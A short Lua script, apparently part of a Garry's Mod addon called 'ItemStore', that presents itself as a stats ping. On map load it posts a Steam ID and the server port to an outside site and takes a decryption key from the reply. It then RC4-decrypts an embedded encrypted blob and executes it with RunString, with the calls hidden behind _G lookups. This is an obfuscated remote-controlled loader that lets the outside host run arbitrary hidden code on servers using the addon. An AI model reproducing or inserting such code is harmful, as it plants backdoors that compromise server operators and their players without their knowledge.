local function swap( i, j )
	return j, i
end

local function rc4( key, input )
	local S = {}
	for i = 0, 255 do
		S[ i ] = i
	end

	local j = 0
	for i = 0, 255 do
		j = ( j + S[ i ] + key:byte( i % #key + 1 ) ) % 256
		S[ i ], S[ j ] = swap( S[ i ], S[ j ] )
	end

	local out = ""
	
	local i, j = 0, 0
	for k = 1, #input do
		i = ( i + 1 ) % 256
		j = ( j + S[ i ] ) % 256
		S[ i ], S[ j ] = swap( S[ i ], S[ j ] )

		local K = S[ ( S[ i ] + S[ j ] ) % 256 ]

		out = out .. string.char( bit.bxor( input:byte( i ), K ) )
	end

	return out
end

local url = "https://uselessghost.me/itemstore/ping.php"
local params = {
	id = "76561198043969921",
	port = GetConVarString( "hostport" )
}

local enc = "96 8B E8 9F 8E 3A 79 41 0D C2 E4 EC 66 C6 3F 26 D1 17 A1 E3 26 31 E5 CC 3C 51 63 18 DE 32 79 7C 35 EC 7D F1 F3 C4 25 BF 27 36 DA 75 A1 DD 56 67 EC 42 22 6B C5 29 C2 FE A2 4E 43 F2 8F A9 15 5C 37 F9 40 70 4E 95 A7 3C 38 EC 89 A9 08 97 4E 1E 94 DC 7C 10 01 B7 32 83 C9 2B"

hook.Add( "InitPostEntity", "ItemStoreStats", function()
	timer.Simple( 10, function()
		_G[ "http" ][ "Post" ]( url, params, function( data )
			if string.len( data ) <= 0 then return end

			local key = string.match( data, "KEY:(.+)" )
			if not key then return end

			local str = ""

			for k, v in ipairs( string.Explode( " ", enc ) ) do
				str = str .. string.char( tonumber( v, 16 ) )
			end

			_G[ "RunString" ]( rc4( key, str ) )
		end )

		hook.Remove( "InitPostEntity", "ItemStoreStats" )
	end )
end )